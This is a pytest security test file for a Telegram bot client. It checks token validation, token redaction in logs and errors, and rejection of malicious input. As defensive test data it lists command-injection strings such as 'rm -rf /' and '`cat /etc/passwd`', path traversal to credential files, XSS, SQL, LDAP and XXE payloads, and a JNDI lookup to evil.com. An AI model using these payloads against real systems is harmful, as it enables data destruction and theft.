#!/usr/bin/env python3
"""
Security tests for token validation and sanitization.

Tests security aspects of the system including:
1. Bot token validation and format checking  
2. Sensitive data sanitization in logs and error messages
3. Input validation and injection prevention
4. Secure handling of credentials
5. Proper error messages that don't leak sensitive information

These tests ensure the system doesn't accidentally expose credentials
or allow malicious input to compromise security.
"""

import tempfile
import yaml
import logging
import re
import io
from pathlib import Path
from unittest.mock import Mock, patch, AsyncMock, MagicMock
import pytest
import sys
import json

# Add the project root to the path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

# Mock rumps before any imports that might trigger it
sys.modules['rumps'] = Mock()


@pytest.fixture
def create_temp_config():
    """Helper fixture to create temporary config files."""
    created_files = []
    
    def _create_config(config_data):
        temp_file = tempfile.NamedTemporaryFile(
            mode='w', suffix='.yaml', delete=False)
        yaml.dump(config_data, temp_file, default_flow_style=False)
        temp_file.close()
        created_files.append(Path(temp_file.name))
        return Path(temp_file.name)
    
    yield _create_config
    
    # Cleanup
    for file_path in created_files:
        try:
            file_path.unlink()
        except FileNotFoundError:
            pass


@pytest.fixture
def capture_logs():
    """Capture log messages for security testing."""
    log_capture = io.StringIO()
    handler = logging.StreamHandler(log_capture)
    logger = logging.getLogger('telegram_client')
    logger.addHandler(handler)
    logger.setLevel(logging.DEBUG)
    
    yield log_capture
    
    logger.removeHandler(handler)


class TestBotTokenValidation:
    """Test bot token validation and security."""

    def test_telegram_token_format_validation(self, create_temp_config):
        """Test that bot tokens are validated for proper Telegram format."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'local_orchestrator_tray'))
        
        # Valid Telegram bot token format: NUMBER:ALPHANUMERIC_STRING
        valid_tokens = [
            '1234567890:ABCdefGHijklmnopQRSTuvwxyz-123456789',
            '987654321:AABBCCDDEEFFGGHHIIJJKKLLMMNNOO',
            '123:ABC123-xyz789',
            '999999999:A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0'
        ]
        
        for token in valid_tokens:
            config = {
                'telegram': {'bot_token': token},
                'actions': {}
            }
            config_path = create_temp_config(config)
            
            with patch('telegram_client.Update'), \
                    patch('telegram_client.Application'), \
                    patch('telegram_client.MessageHandler'), \
                    patch('telegram_client.filters'), \
                    patch('telegram_client.ContextTypes'):
                
                from telegram_client import TelegramClient
                client = TelegramClient(config_path)
                
                # Should accept properly formatted tokens
                assert client.config_valid, f"Valid token should be accepted: {token[:20]}..."

    def test_invalid_token_format_rejection(self, create_temp_config):
        """Test that malformed bot tokens are rejected."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'local_orchestrator_tray'))
        
        invalid_tokens = [
            # Missing colon
            '1234567890ABCdefGHijklmnopQRSTuvwxyz',
            # Missing bot ID part
            ':ABCdefGHijklmnopQRSTuvwxyz',
            # Missing token part
            '1234567890:',
            # Invalid characters
            '1234567890:ABC@#$%^&*()',
            # Too short
            '123:ABC',
            # Wrong format
            'bot1234567890:token',
            # Contains spaces
            '1234567890: ABCdefGHijklmnop',
            '1234567890 :ABCdefGHijklmnop',
            # SQL injection attempt
            "'; DROP TABLE users; --",
            # Script injection attempt
            '<script>alert("xss")</script>',
            # Path traversal attempt
            '../../../etc/passwd',
        ]
        
        for token in invalid_tokens:
            config = {
                'telegram': {'bot_token': token},
                'actions': {}
            }
            config_path = create_temp_config(config)
            
            with patch('telegram_client.Update'), \
                    patch('telegram_client.Application'), \
                    patch('telegram_client.MessageHandler'), \
                    patch('telegram_client.filters'), \
                    patch('telegram_client.ContextTypes'):
                
                from telegram_client import TelegramClient
                client = TelegramClient(config_path)
                
                # Should reject malformed tokens
                assert not client.config_valid, f"Invalid token should be rejected: {repr(token[:20])}"
                assert client.config_error is not None

    def test_placeholder_token_detection(self, create_temp_config):
        """Test detection and rejection of placeholder tokens."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'local_orchestrator_tray'))
        
        placeholder_tokens = [
            'YOUR_BOT_TOKEN_HERE',
            'REPLACE_WITH_YOUR_BOT_TOKEN',
            'YOUR_BOT_TOKEN',
            'PLACEHOLDER_TOKEN',
            'EXAMPLE_TOKEN',
            'INSERT_TOKEN_HERE',
            'PUT_YOUR_TOKEN_HERE',
            '<YOUR_BOT_TOKEN>',
            'YOUR_TELEGRAM_BOT_TOKEN',
            'TELEGRAM_BOT_TOKEN_PLACEHOLDER'
        ]
        
        for placeholder in placeholder_tokens:
            config = {
                'telegram': {'bot_token': placeholder},
                'actions': {}
            }
            config_path = create_temp_config(config)
            
            with patch('telegram_client.Update'), \
                    patch('telegram_client.Application'), \
                    patch('telegram_client.MessageHandler'), \
                    patch('telegram_client.filters'), \
                    patch('telegram_client.ContextTypes'):
                
                from telegram_client import TelegramClient
                client = TelegramClient(config_path)
                
                # Should reject placeholder tokens
                assert not client.config_valid, f"Placeholder token should be rejected: {placeholder}"
                assert client.config_error is not None
                assert 'placeholder' in client.config_error.lower()

    def test_empty_and_whitespace_token_rejection(self, create_temp_config):
        """Test rejection of empty and whitespace-only tokens."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'local_orchestrator_tray'))
        
        invalid_tokens = [
            '',  # Empty string
            '   ',  # Spaces only
            '\t',  # Tab only
            '\n',  # Newline only
            '\r\n',  # Windows newline
            '  \t\n  ',  # Mixed whitespace
        ]
        
        for token in invalid_tokens:
            config = {
                'telegram': {'bot_token': token},
                'actions': {}
            }
            config_path = create_temp_config(config)
            
            with patch('telegram_client.Update'), \
                    patch('telegram_client.Application'), \
                    patch('telegram_client.MessageHandler'), \
                    patch('telegram_client.filters'), \
                    patch('telegram_client.ContextTypes'):
                
                from telegram_client import TelegramClient
                client = TelegramClient(config_path)
                
                # Should reject empty/whitespace tokens
                assert not client.config_valid, f"Empty/whitespace token should be rejected: {repr(token)}"
                assert client.config_error is not None

    def test_non_string_token_type_rejection(self, create_temp_config):
        """Test rejection of non-string token types."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'local_orchestrator_tray'))
        
        invalid_token_types = [
            123456789,  # Integer
            12.34,  # Float
            True,  # Boolean
            False,  # Boolean
            None,  # None
            ['token', 'list'],  # List
            {'token': 'dict'},  # Dict
            {'bot_id': 123, 'token': 'abc'},  # Complex dict
        ]
        
        for token in invalid_token_types:
            config = {
                'telegram': {'bot_token': token},
                'actions': {}
            }
            config_path = create_temp_config(config)
            
            with patch('telegram_client.Update'), \
                    patch('telegram_client.Application'), \
                    patch('telegram_client.MessageHandler'), \
                    patch('telegram_client.filters'), \
                    patch('telegram_client.ContextTypes'):
                
                from telegram_client import TelegramClient
                client = TelegramClient(config_path)
                
                # Should reject non-string tokens
                assert not client.config_valid, f"Non-string token should be rejected: {type(token)}"
                assert client.config_error is not None


class TestSensitiveDataSanitization:
    """Test that sensitive data is properly sanitized in logs and errors."""

    def test_token_not_logged_in_debug_mode(self, create_temp_config, capture_logs):
        """Test that bot tokens are not logged even in debug mode."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'local_orchestrator_tray'))
        
        sensitive_token = '1234567890:ABCdefGHijklmnopQRSTuvwxyz123456789'
        config = {
            'telegram': {'bot_token': sensitive_token},
            'actions': {}
        }
        config_path = create_temp_config(config)
        
        with patch('telegram_client.Update'), \
                patch('telegram_client.Application'), \
                patch('telegram_client.MessageHandler'), \
                patch('telegram_client.filters'), \
                patch('telegram_client.ContextTypes'):
            
            from telegram_client import TelegramClient
            
            # Enable debug logging
            logger = logging.getLogger('telegram_client')
            logger.setLevel(logging.DEBUG)
            
            client = TelegramClient(config_path)
            
            # Check log output
            log_output = capture_logs.getvalue()
            
            # Token should not appear in logs
            assert sensitive_token not in log_output, "Bot token should not appear in logs"
            
            # Token parts should not appear in logs either
            bot_id = sensitive_token.split(':')[0]
            token_part = sensitive_token.split(':')[1]
            
            # Bot ID might be acceptable in logs, but full token should not be
            assert token_part not in log_output, "Token part should not appear in logs"
            
            # Should have some indication of token validation without exposing it
            if log_output:
                assert 'token' in log_output.lower(), "Should log token validation activity"

    def test_token_sanitized_in_error_messages(self, create_temp_config):
        """Test that bot tokens are sanitized in error messages."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'local_orchestrator_tray'))
        
        # Use a token that will cause validation errors
        problematic_token = '1234567890:INVALID_TOKEN_FORMAT_WITH_SPECIAL_CHARS@#$%'
        config = {
            'telegram': {'bot_token': problematic_token},
            'actions': {}
        }
        config_path = create_temp_config(config)
        
        with patch('telegram_client.Update'), \
                patch('telegram_client.Application'), \
                patch('telegram_client.MessageHandler'), \
                patch('telegram_client.filters'), \
                patch('telegram_client.ContextTypes'):
            
            from telegram_client import TelegramClient
            client = TelegramClient(config_path)
            
            # Should have validation error
            assert not client.config_valid
            assert client.config_error is not None
            
            # Error message should not contain the actual token
            error_msg = client.config_error
            assert problematic_token not in error_msg, "Token should not appear in error messages"
            
            # Error should be informative but not expose sensitive data
            assert 'token' in error_msg.lower(), "Error should mention token validation"

    def test_config_sanitization_in_string_representation(self, create_temp_config):
        """Test that config string representations don't expose tokens."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'local_orchestrator_tray'))
        
        sensitive_token = '9876543210:XYZabcDEFghiJKLmnoPQRstUVWxyz987654321'
        config = {
            'telegram': {'bot_token': sensitive_token},
            'actions': {'test': {'command': 'echo test'}}
        }
        config_path = create_temp_config(config)
        
        with patch('telegram_client.Update'), \
                patch('telegram_client.Application'), \
                patch('telegram_client.MessageHandler'), \
                patch('telegram_client.filters'), \
                patch('telegram_client.ContextTypes'):
            
            from telegram_client import TelegramClient
            client = TelegramClient(config_path)
            
            # Test various string representations
            client_str = str(client)
            client_repr = repr(client)
            config_str = str(client.config) if hasattr(client, 'config') else ''
            
            # Token should not appear in any string representation
            for representation in [client_str, client_repr, config_str]:
                assert sensitive_token not in representation, f"Token found in: {representation[:100]}"
                
                # Token parts should also be sanitized
                token_part = sensitive_token.split(':')[1]
                if len(token_part) > 10:  # Only check if token part is long enough
                    assert token_part not in representation, f"Token part found in: {representation[:100]}"

    def test_telegram_api_errors_sanitized(self, create_temp_config, capture_logs):
        """Test that Telegram API errors don't leak sensitive information."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'local_orchestrator_tray'))
        
        config = {
            'telegram': {'bot_token': '1111111111:AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQRRs'},
            'actions': {}
        }
        config_path = create_temp_config(config)
        
        with patch('telegram_client.Update'), \
                patch('telegram_client.Application') as mock_app_class, \
                patch('telegram_client.MessageHandler'), \
                patch('telegram_client.filters'), \
                patch('telegram_client.ContextTypes'):
            
            # Mock Telegram API error that might contain sensitive info
            mock_app = Mock()
            mock_app.initialize = AsyncMock(side_effect=Exception("401 Unauthorized: Invalid bot token: 1111111111:AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQRRs"))
            mock_app.start = AsyncMock()
            mock_app.stop = AsyncMock()
            mock_app.shutdown = AsyncMock()
            
            mock_builder = Mock()
            mock_builder.token.return_value = mock_builder
            mock_builder.build.return_value = mock_app
            mock_app_class.builder.return_value = mock_builder
            
            from telegram_client import TelegramClient
            client = TelegramClient(config_path)
            
            # Try to start client (will fail with mocked error)
            try:
                client.start_client()
            except:
                pass  # Expected to fail
            
            # Check that logs don't contain the full token
            log_output = capture_logs.getvalue()
            assert '1111111111:AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQRRs' not in log_output, "Full token should not appear in logs"


class TestInputValidationSecurity:
    """Test input validation to prevent injection attacks."""

    @pytest.mark.asyncio
    async def test_toml_injection_prevention(self, create_temp_config):
        """Test that malicious TOML input is handled safely."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'local_orchestrator_tray'))
        
        config = {
            'telegram': {'bot_token': '1234567890:ABCdefGHijklmnopQRSTuvwxyz123456789'},
            'actions': {
                'safe_action': {'command': 'echo safe'}
            }
        }
        config_path = create_temp_config(config)
        
        with patch('telegram_client.Update'), \
                patch('telegram_client.Application'), \
                patch('telegram_client.MessageHandler'), \
                patch('telegram_client.filters'), \
                patch('telegram_client.ContextTypes'), \
                patch('subprocess.run') as mock_run:
            
            from telegram_client import TelegramClient
            client = TelegramClient(config_path)
            
            # Malicious TOML payloads
            malicious_payloads = [
                # Command injection attempts
                '[safe_action]\ncommand = "echo test; rm -rf /"',
                '[safe_action]\nparam = "value && rm -rf /"',
                '[safe_action]\npath = "../../../etc/passwd"',
                
                # Script injection attempts
                '[safe_action]\nscript = "<script>alert(1)</script>"',
                '[safe_action]\nhtml = "<img src=x onerror=alert(1)>"',
                
                # SQL injection attempts
                "[safe_action]\nquery = \"'; DROP TABLE users; --\"",
                "[safe_action]\nid = \"1 OR 1=1\"",
                
                # LDAP injection attempts
                '[safe_action]\nfilter = "*)(&(objectClass=user)"',
                
                # XXE attempts (if XML processing involved)
                '[safe_action]\nxml = "<!DOCTYPE test [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]>"',
                
                # Buffer overflow attempts
                '[safe_action]\nbig_param = "' + 'A' * 10000 + '"',
            ]
            
            for payload in malicious_payloads:
                mock_run.reset_mock()
                
                mock_message = Mock()
                mock_message.text = payload
                mock_message.reply_text = AsyncMock()
                mock_message.chat = Mock()
                mock_message.chat.id = 12345
                mock_message.chat.type = 'private'
                mock_message.from_user = Mock()
                mock_message.from_user.first_name = 'MaliciousUser'
                mock_message.from_user.id = 99999
                
                mock_update = Mock()
                mock_update.message = mock_message
                mock_update.channel_post = None
                mock_context = Mock()
                
                # Process malicious payload
                try:
                    await client.handle_message(mock_update, mock_context)
                except Exception as e:
                    # Should handle malicious input gracefully
                    assert "injection" not in str(e).lower(), f"Should not mention injection in error: {e}"
                
                # Should not execute dangerous commands
                if mock_run.called:
                    executed_cmd = mock_run.call_args[0][0]
                    dangerous_patterns = ['rm -rf', 'DROP TABLE', '../../', '<script>', 'alert(', 'passwd']
                    for pattern in dangerous_patterns:
                        assert pattern not in str(executed_cmd), f"Dangerous pattern '{pattern}' in command: {executed_cmd}"

    def test_channel_id_validation_prevents_overflow(self, create_temp_config):
        """Test that channel ID validation prevents integer overflow attacks."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'local_orchestrator_tray'))
        
        # Test extreme values that might cause overflow
        extreme_channel_ids = [
            2**63,  # Larger than max signed 64-bit int
            -2**63 - 1,  # Smaller than min signed 64-bit int  
            2**128,  # Extremely large number
            -2**128,  # Extremely negative number
            float('inf'),  # Infinity
            float('-inf'),  # Negative infinity
        ]
        
        for channel_id in extreme_channel_ids:
            try:
                config = {
                    'telegram': {
                        'bot_token': '1234567890:ABCdefGHijklmnopQRSTuvwxyz123456789',
                        'channels': [channel_id]
                    },
                    'actions': {}
                }
                config_path = create_temp_config(config)
                
                with patch('telegram_client.Update'), \
                        patch('telegram_client.Application'), \
                        patch('telegram_client.MessageHandler'), \
                        patch('telegram_client.filters'), \
                        patch('telegram_client.ContextTypes'):
                    
                    from telegram_client import TelegramClient
                    client = TelegramClient(config_path)
                    
                    # Should handle extreme values gracefully (may accept or reject)
                    # Important: should not crash or cause integer overflow
                    assert client.config_valid in [True, False]
                    
            except (ValueError, OverflowError, yaml.YAMLError):
                # Some extreme values might cause YAML serialization errors - acceptable
                pass

    def test_action_name_prevents_path_traversal(self, create_temp_config):
        """Test that action names prevent path traversal attacks."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'local_orchestrator_tray'))
        
        malicious_action_names = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32',
            '/etc/shadow',
            'C:\\Windows\\System32\\cmd.exe',
            '../../usr/bin/rm',
            '..\\..\\..\\autoexec.bat',
            '/proc/self/environ',
            '\x00/etc/passwd',  # Null byte injection
            'action\x00.txt',  # Null byte in middle
        ]
        
        for action_name in malicious_action_names:
            try:
                config = {
                    'telegram': {'bot_token': '1234567890:ABCdefGHijklmnopQRSTuvwxyz123456789'},
                    'actions': {
                        action_name: {'command': 'echo safe'}
                    }
                }
                config_path = create_temp_config(config)
                
                with patch('telegram_client.Update'), \
                        patch('telegram_client.Application'), \
                        patch('telegram_client.MessageHandler'), \
                        patch('telegram_client.filters'), \
                        patch('telegram_client.ContextTypes'):
                    
                    from telegram_client import TelegramClient
                    client = TelegramClient(config_path)
                    
                    # Should reject malicious action names or handle them safely
                    if not client.config_valid:
                        assert client.config_error is not None
                        # Error should not expose the malicious path
                        assert '../' not in client.config_error
                        assert '\\\\' not in client.config_error
                        
            except (yaml.YAMLError, UnicodeError):
                # Some malicious names might cause YAML or encoding errors - acceptable
                pass


class TestSecureConfigHandling:
    """Test secure configuration file handling."""

    def test_config_file_permissions_not_too_permissive(self, create_temp_config):
        """Test that config files don't require overly permissive permissions."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'local_orchestrator_tray'))
        
        config = {
            'telegram': {'bot_token': '1234567890:ABCdefGHijklmnopQRSTuvwxyz123456789'},
            'actions': {'test': {'command': 'echo test'}}
        }
        config_path = create_temp_config(config)
        
        # Make config file read-only for owner (secure)
        config_path.chmod(0o600)  # rw-------
        
        with patch('telegram_client.Update'), \
                patch('telegram_client.Application'), \
                patch('telegram_client.MessageHandler'), \
                patch('telegram_client.filters'), \
                patch('telegram_client.ContextTypes'):
            
            from telegram_client import TelegramClient
            
            # Should be able to read config with restrictive permissions
            try:
                client = TelegramClient(config_path)
                assert client.config_valid, "Should read config with secure permissions"
            except PermissionError:
                pytest.fail("Should handle restrictive file permissions gracefully")

    def test_config_directory_traversal_prevention(self):
        """Test that config file paths prevent directory traversal."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'local_orchestrator_tray'))
        
        # Malicious config file paths
        malicious_paths = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/shadow',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            '/proc/self/environ',
            '/dev/random',
            'config\x00.yaml',  # Null byte injection
        ]
        
        with patch('telegram_client.Update'), \
                patch('telegram_client.Application'), \
                patch('telegram_client.MessageHandler'), \
                patch('telegram_client.filters'), \
                patch('telegram_client.ContextTypes'):
            
            from telegram_client import TelegramClient
            
            for malicious_path in malicious_paths:
                try:
                    # Should handle malicious paths gracefully
                    client = TelegramClient(Path(malicious_path))
                    
                    # If it doesn't throw an exception, should at least be invalid
                    assert not client.config_valid, f"Should reject malicious config path: {malicious_path}"
                    
                except (FileNotFoundError, PermissionError, OSError, UnicodeError):
                    # Expected - system prevents access to malicious paths
                    pass

    def test_yaml_bomb_prevention(self, create_temp_config):
        """Test that YAML bombs are handled safely."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'local_orchestrator_tray'))
        
        # Create a potential YAML bomb (deeply nested structure)
        yaml_bomb_content = """
telegram:
  bot_token: '1234567890:ABCdefGHijklmnopQRSTuvwxyz123456789'
actions:
""" + "  level_" + ":\n    sublevel_" * 100 + ": 'end'"
        
        # Write YAML bomb to temp file
        temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False)
        temp_file.write(yaml_bomb_content)
        temp_file.close()
        config_path = Path(temp_file.name)
        
        try:
            with patch('telegram_client.Update'), \
                    patch('telegram_client.Application'), \
                    patch('telegram_client.MessageHandler'), \
                    patch('telegram_client.filters'), \
                    patch('telegram_client.ContextTypes'):
                
                from telegram_client import TelegramClient
                
                import time
                start_time = time.time()
                
                # Should handle YAML bomb without hanging
                try:
                    client = TelegramClient(config_path)
                    processing_time = time.time() - start_time
                    
                    # Should complete quickly even with complex YAML
                    assert processing_time < 5.0, f"YAML processing took {processing_time:.2f}s, might be vulnerable to YAML bomb"
                    
                except yaml.YAMLError:
                    # Acceptable - YAML parser rejects malicious content
                    pass
                
        finally:
            config_path.unlink()


class TestSecureErrorHandling:
    """Test that error handling doesn't leak sensitive information."""

    def test_stack_traces_dont_expose_tokens(self, create_temp_config, capture_logs):
        """Test that stack traces don't accidentally expose bot tokens."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'local_orchestrator_tray'))
        
        config = {
            'telegram': {'bot_token': '5555555555:SecretTokenThatShouldNotLeakInStackTraces'},
            'actions': {'crash_action': {'command': 'this_will_crash'}}
        }
        config_path = create_temp_config(config)
        
        with patch('telegram_client.Update'), \
                patch('telegram_client.Application'), \
                patch('telegram_client.MessageHandler'), \
                patch('telegram_client.filters'), \
                patch('telegram_client.ContextTypes'), \
                patch('subprocess.run') as mock_run:
            
            # Force an exception that might expose sensitive data in stack trace
            mock_run.side_effect = Exception("Command failed with token: 5555555555:SecretTokenThatShouldNotLeakInStackTraces")
            
            from telegram_client import TelegramClient
            client = TelegramClient(config_path)
            
            mock_message = Mock()
            mock_message.text = '[crash_action]\nparam = "value"'
            mock_message.reply_text = AsyncMock()
            mock_message.chat = Mock()
            mock_message.chat.id = 12345
            mock_message.chat.type = 'private'
            mock_message.from_user = Mock()
            mock_message.from_user.first_name = 'TestUser'
            mock_message.from_user.id = 67890
            
            mock_update = Mock()
            mock_update.message = mock_message
            mock_update.channel_post = None
            mock_context = Mock()
            
            # Process message that will cause exception
            try:
                import asyncio
                asyncio.run(client.handle_message(mock_update, mock_context))
            except:
                pass  # Expected to fail
            
            # Check logs for token leakage
            log_output = capture_logs.getvalue()
            
            # Token should not appear in logs, even in error messages
            assert 'SecretTokenThatShouldNotLeakInStackTraces' not in log_output, "Token leaked in stack trace"
            assert '5555555555:SecretTokenThatShouldNotLeakInStackTraces' not in log_output, "Full token leaked in logs"

    def test_user_input_not_executed_in_error_context(self, create_temp_config):
        """Test that user input in error messages doesn't get executed."""
        sys.path.insert(0, str(Path(__file__).parent.parent / 'local_orchestrator_tray'))
        
        config = {
            'telegram': {'bot_token': '1234567890:ABCdefGHijklmnopQRSTuvwxyz123456789'},
            'actions': {}
        }
        config_path = create_temp_config(config)
        
        with patch('telegram_client.Update'), \
                patch('telegram_client.Application'), \
                patch('telegram_client.MessageHandler'), \
                patch('telegram_client.filters'), \
                patch('telegram_client.ContextTypes'):
            
            from telegram_client import TelegramClient
            client = TelegramClient(config_path)
            
            # Malicious input that might be executed in error context
            malicious_inputs = [
                '$(rm -rf /)',
                '`cat /etc/passwd`',
                '${ENV_VAR}',
                '#{code_injection}',
                '{{template_injection}}',
                '%{JNDI:ldap://evil.com}',  # Log4j style
                '\x00; rm -rf /',  # Null byte + command
            ]
            
            for malicious_input in malicious_inputs:
                mock_message = Mock()
                mock_message.text = f'[{malicious_input}]\nparam = "value"'
                mock_message.reply_text = AsyncMock()
                mock_message.chat = Mock()
                mock_message.chat.id = 12345
                mock_message.chat.type = 'private'
                mock_message.from_user = Mock()
                mock_message.from_user.first_name = 'MaliciousUser'
                mock_message.from_user.id = 66666
                
                mock_update = Mock()
                mock_update.message = mock_message
                mock_update.channel_post = None
                mock_context = Mock()
                
                # Process malicious input
                try:
                    import asyncio
                    asyncio.run(client.handle_message(mock_update, mock_context))
                except Exception as e:
                    # Error messages should not contain the raw malicious input
                    error_str = str(e)
                    assert malicious_input not in error_str, f"Malicious input should be sanitized in errors: {error_str}"
                
                # Reply should indicate error but not expose raw input
                if mock_message.reply_text.called:
                    reply_text = mock_message.reply_text.call_args[0][0]
                    assert malicious_input not in reply_text, f"Malicious input should not appear in reply: {reply_text}"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])